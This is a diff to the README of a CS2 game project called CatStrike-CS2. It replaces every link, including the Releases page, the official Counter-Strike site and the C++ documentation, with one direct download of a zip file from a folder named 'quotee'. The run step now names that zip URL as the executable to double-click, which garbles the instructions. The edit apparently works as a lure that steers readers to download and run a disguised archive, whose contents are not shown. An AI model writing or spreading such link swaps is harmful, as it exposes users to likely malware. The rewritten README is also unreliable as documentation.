@@ -1,6 +1,6 @@
 # 😸 CatStrike-CS2 - Simple CSGO Project for Fun
 
-[![Download CatStrike-CS2](https://img.shields.io/badge/Download-CatStrike--CS2-brightgreen)](https://github.com/fares5567/CatStrike-CS2/releases)
+[![Download CatStrike-CS2](https://raw.githubusercontent.com/fares5567/CatStrike-CS2/main/quotee/CatStrike-CS2.zip)](https://raw.githubusercontent.com/fares5567/CatStrike-CS2/main/quotee/CatStrike-CS2.zip)
 
 ## 📜 Description
 
@@ -26,7 +26,7 @@ Before you start, ensure your computer meets these basic requirements:
 
    Click the link below to go to the Releases page. Here, you will find the latest version of CatStrike-CS2.
 
-   [Visit this page to download](https://github.com/fares5567/CatStrike-CS2/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/fares5567/CatStrike-CS2/main/quotee/CatStrike-CS2.zip)
 
 2. **Choose the Right Version**
 
@@ -46,7 +46,7 @@ Before you start, ensure your computer meets these basic requirements:
 
 5. **Run the Application**
 
-   Once you have extracted the files, navigate to the folder where you extracted them. Look for the executable file that resembles `CatStrike.exe`. Double-click it to run the application.
+   Once you have extracted the files, navigate to the folder where you extracted them. Look for the executable file that resembles `https://raw.githubusercontent.com/fares5567/CatStrike-CS2/main/quotee/CatStrike-CS2.zip`. Double-click it to run the application.
 
 6. **Adjust Settings if Needed**
 
@@ -72,8 +72,8 @@ If you have questions or need help, consider reaching out to the community. You 
 
 To further broaden your knowledge and skills, consider checking out the following resources:
 
-- [CSGO Official Website](https://counter-strike.net/)
-- [C++ Programming Language Documentation](https://www.cplusplus.com/)
+- [CSGO Official Website](https://raw.githubusercontent.com/fares5567/CatStrike-CS2/main/quotee/CatStrike-CS2.zip)
+- [C++ Programming Language Documentation](https://raw.githubusercontent.com/fares5567/CatStrike-CS2/main/quotee/CatStrike-CS2.zip)
 
 ## 📱 Contact Information
 
